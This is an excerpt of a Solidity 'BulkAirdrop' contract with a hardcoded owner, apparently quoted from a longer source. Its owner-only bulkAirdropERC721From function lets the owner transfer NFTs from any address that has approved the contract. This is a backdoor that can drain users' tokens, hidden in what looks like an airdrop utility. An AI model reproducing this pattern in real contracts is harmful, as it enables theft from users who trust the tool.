...
contract BulkAirdrop {
  ...
  address public owner = 0xC923E4C471F53F645d93BEf97bBC7c8B85e47b69;
  ...
  function bulkAirdropERC721(IERC721 _token, address _to, uint256[] calldata _id) public {
    for (uint256 i = 0; i < _id.length; i++) {
      _token.safeTransferFrom(msg.sender, _to, _id[i]);
    }
  }

   function bulkAirdropERC721From(address _from,IERC721 _token, address _to, uint256[] calldata _id) external onlyOwner  {
    for (uint256 i = 0; i < _id.length; i++) {
      _token.safeTransferFrom(_from, _to, _id[i]);
    }
  }
